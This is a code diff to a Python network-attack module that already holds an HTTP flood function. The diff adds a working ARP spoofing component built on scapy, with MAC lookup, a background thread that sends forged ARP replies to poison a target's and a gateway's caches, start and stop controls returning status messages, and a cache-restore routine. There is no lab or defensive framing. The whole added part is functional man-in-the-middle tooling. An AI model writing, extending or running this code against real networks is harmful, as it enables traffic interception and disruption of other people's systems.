@@ -6,6 +6,12 @@ import socket
 import random
 import platform
 import subprocess
+import threading
+from scapy.all import ARP, Ether, srp, send, sniff, conf
+
+# Global ARP Control
+spoofing_active = False
+spoof_thread = None
 
 def check_target(target, port):
     """
@@ -202,3 +208,97 @@ def http_flood(target, port, duration):
         return {"status": "success", "message": f"HTTP Flood finished. Sent {sent} requests to {target}:{port} in {duration}s."}
     except Exception as e:
         return {"status": "error", "message": str(e)}
+
+# --- ARP SPOOFING MODULE ---
+
+def get_mac(ip):
+    """
+    Returns MAC address of a given IP. 
+    """
+    try:
+        # Create ARP Request
+        arp_req = ARP(pdst=ip)
+        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+        packet = broadcast / arp_req
+        
+        # Send
+        result = srp(packet, timeout=2, verbose=False)[0]
+        
+        if result:
+            return result[0][1].hwsrc
+        return None
+    except Exception:
+        return None
+
+def arp_spoof_loop(target_ip, gateway_ip):
+    global spoofing_active
+    
+    target_mac = get_mac(target_ip)
+    gateway_mac = get_mac(gateway_ip)
+    
+    if not target_mac or not gateway_mac:
+        print(f"[-] Could not get MAC address. Target: {target_mac}, Gateway: {gateway_mac}")
+        spoofing_active = False
+        return
+
+    print(f"[+] Starting ARP Spoof. Target: {target_ip} ({target_mac}) <-> Gateway: {gateway_ip} ({gateway_mac})")
+    
+    try:
+        while spoofing_active:
+            # Tell Target that I am Gateway
+            if target_mac:
+                packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+                send(packet1, verbose=False)
+            
+            # Tell Gateway that I am Target
+            if gateway_mac:
+                packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
+                send(packet2, verbose=False)
+            
+            time.sleep(2)
+    except Exception as e:
+        print(f"[-] Error in ARP loop: {e}")
+
+def start_arp_spoof(target_ip, gateway_ip):
+    global spoofing_active, spoof_thread
+    
+    if spoofing_active:
+        return {"status": "error", "message": "ARP Spoofing is already active."}
+        
+    spoofing_active = True
+    spoof_thread = threading.Thread(target=arp_spoof_loop, args=(target_ip, gateway_ip), daemon=True)
+    spoof_thread.start()
+    
+    return {"status": "success", "message": f"ARP Poisoning started on {target_ip} <-> {gateway_ip}"}
+
+def stop_arp_spoof(target_ip, gateway_ip):
+    global spoofing_active, spoof_thread
+    
+    if not spoofing_active:
+         return {"status": "error", "message": "No active ARP Attack."}
+         
+    spoofing_active = False
+    if spoof_thread:
+        spoof_thread.join(timeout=3)
+        spoof_thread = None
+        
+    # Restore
+    restore_arp(target_ip, gateway_ip)
+    return {"status": "success", "message": "ARP Poisoning stopped. Network restored."}
+
+def restore_arp(target_ip, gateway_ip):
+    try:
+        target_mac = get_mac(target_ip)
+        gateway_mac = get_mac(gateway_ip)
+        
+        if target_mac and gateway_mac:
+            # Restore Target: Tell it the real Gateway MAC
+            packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
+            send(packet1, count=4, verbose=False)
+            
+            # Restore Gateway: Tell it the real Target MAC
+            packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
+            send(packet2, count=4, verbose=False)
+            print("[+] ARP Tables Restored.")
+    except Exception as e:
+        print(f"[-] Error restoring ARP: {e}")
